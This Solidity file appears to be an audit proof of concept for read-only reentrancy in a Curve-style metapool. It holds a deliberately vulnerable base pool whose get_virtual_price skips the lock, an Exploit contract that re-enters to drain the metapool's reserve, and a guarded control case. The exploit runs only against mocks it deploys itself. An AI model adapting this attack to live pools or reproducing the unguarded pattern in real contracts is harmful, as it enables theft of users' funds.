// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Curve StableSwap-NG metapool — an old ETH base pool's get_virtual_price
    is not behind the reentrancy lock (MixBytes). remove_liquidity lowers
    supply and raw_calls the sender before it returns, while D is unchanged.
    Virtual price = D/supply jumps. The metapool sells base LP at that rate
    and the caller drains the coin reserve. A base pool that reverts
    get_virtual_price while locked pays nothing. */

contract Cash27689 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IBase27689 {
    function get_virtual_price() external view returns (uint256);
    function lpOf(address who) external view returns (uint256);
    function debitLp(address who, uint256 amt) external;
}

contract OldBase27689 is IBase27689 {
    uint256 public D;
    uint256 public supply;
    bool public locked;
    bool public guardView;
    mapping(address => uint256) public lpOf;

    constructor(bool guard) {
        guardView = guard;
    }

    function init(uint256 d, uint256 s, address lp) external {
        D = d;
        supply = s;
        lpOf[lp] = s;
    }

    function debitLp(address who, uint256 amt) external {
        lpOf[who] -= amt;
    }

    function get_virtual_price() external view returns (uint256) {
        if (guardView) {
            require(!locked, "locked");
        }
        // @> VULN: old ETH base pools do not check the reentrancy lock here. D/supply is read while supply is already reduced.
        return D * 1e18 / supply;
    }

    function remove_liquidity(uint256 lp, address to) external {
        require(lpOf[msg.sender] >= lp, "lp");
        lpOf[msg.sender] -= lp;
        require(!locked, "reenter");
        locked = true;
        supply -= lp;
        (bool ok,) = to.call("");
        ok;
        locked = false;
    }
}

contract MetaPool27689 {
    IBase27689 public base;
    Cash27689 public coin;
    uint256 public lastPrice;
    uint256 public lastOut;

    constructor(IBase27689 b, Cash27689 c) {
        base = b;
        coin = c;
    }

    function exchange(uint256 dx) external returns (uint256 dy) {
        require(base.lpOf(msg.sender) >= dx, "lp");
        base.debitLp(msg.sender, dx);
        uint256 price = base.get_virtual_price();
        dy = dx * price / 1e18;
        uint256 bal = coin.balanceOf(address(this));
        if (dy > bal) {
            dy = bal;
        }
        coin.transfer(msg.sender, dy);
        lastPrice = price;
        lastOut = dy;
    }
}

contract Exploit {
    uint256 public constant D_VALUE = 1000 ether;
    uint256 public constant SUPPLY = 1000 ether;
    uint256 public constant REMOVE = 900 ether;
    uint256 public constant DX = 100 ether;
    uint256 public constant POOL = 1000 ether;

    Cash27689 public coin;
    OldBase27689 public base;
    MetaPool27689 public meta;
    Cash27689 public coinC;
    OldBase27689 public baseC;
    MetaPool27689 public metaC;

    uint256 public reserve;
    uint256 public stolen;
    uint256 public priceUsed;
    uint256 public poolLeft;
    uint256 public controlOut;
    uint256 public controlLeft;

    receive() external payable {
        if (msg.sender == address(base)) {
            stolen = meta.exchange(DX);
            priceUsed = meta.lastPrice();
        } else if (msg.sender == address(baseC)) {
            try metaC.exchange(DX) returns (uint256 out) {
                controlOut = out;
            } catch {
                controlOut = 0;
            }
        }
    }

    function run() external {
        coin = new Cash27689();
        base = new OldBase27689(false);
        meta = new MetaPool27689(base, coin);
        coinC = new Cash27689();
        baseC = new OldBase27689(true);
        metaC = new MetaPool27689(baseC, coinC);

        base.init(D_VALUE, SUPPLY, address(this));
        coin.mint(address(meta), POOL);
        reserve = coin.balanceOf(address(meta));

        base.remove_liquidity(REMOVE, address(this));
        poolLeft = coin.balanceOf(address(meta));

        baseC.init(D_VALUE, SUPPLY, address(this));
        coinC.mint(address(metaC), POOL);
        baseC.remove_liquidity(REMOVE, address(this));
        controlLeft = coinC.balanceOf(address(metaC));

        require(reserve == POOL, "reserve");
        require(priceUsed == 10 ether, "price");
        require(stolen == POOL, "stolen");
        require(poolLeft == 0, "pool");
        require(coin.balanceOf(address(this)) == POOL, "attacker");
        require(controlOut == 0, "control out");
        require(controlLeft == POOL, "control left");
        require(coinC.balanceOf(address(this)) == 0, "control attacker");
    }
}
